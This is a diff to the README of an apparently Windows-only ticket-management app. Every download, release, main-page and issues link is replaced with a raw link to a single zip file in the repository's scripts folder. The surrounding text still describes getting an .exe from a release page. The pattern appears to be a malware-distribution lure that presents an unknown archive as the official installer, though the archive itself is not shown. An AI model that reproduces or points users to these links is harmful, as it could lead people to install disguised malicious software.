@@ -1,6 +1,6 @@
 # 🎫 ticket-management-system - Simple Ticket Tracking Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Fourply-leporid594/ticket-management-system/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer meets these requirements, you are ready to install TMS.
 
 1. **Go to the release page**  
 Click this link to visit the place where you can get the app:  
-[Download TMS on GitHub](https://github.com/Fourply-leporid594/ticket-management-system/releases)
+[Download TMS on GitHub](https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip)
 
 2. **Choose the right file**  
 Look for the latest release version. It will be named with a number, like “v1.0” or “v1.2”. Inside that, find the Windows installer file. It usually ends with `.exe`.  
@@ -80,7 +80,7 @@ Choose how you want notifications, appearance, and other options to work. These 
 ## 📥 Download and Setup Recap
 
 If you want to start now, visit the release page here:  
-[Download ticket-management-system](https://github.com/Fourply-leporid594/ticket-management-system/releases)  
+[Download ticket-management-system](https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip)  
 
 Follow the instructions to download the latest Windows installer `.exe`. Run it and use the installer to complete setup. Then open the app, create an account if needed, and begin adding tickets.
 
@@ -114,9 +114,9 @@ A: This guide covers Windows only. Versions for other systems may be available b
 
 ## 🔗 Useful Links
 
-- Main GitHub page: https://github.com/Fourply-leporid594/ticket-management-system  
-- Download releases: https://github.com/Fourply-leporid594/ticket-management-system/releases  
-- Issues and support: https://github.com/Fourply-leporid594/ticket-management-system/issues  
+- Main GitHub page: https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip  
+- Download releases: https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip  
+- Issues and support: https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip  
 
 ---
 
@@ -132,4 +132,4 @@ While you don’t need to understand these technologies to use the app, here is 
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Fourply-leporid594/ticket-management-system/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Fourply-leporid594/ticket-management-system/main/scripts/system_ticket_management_1.4.zip)
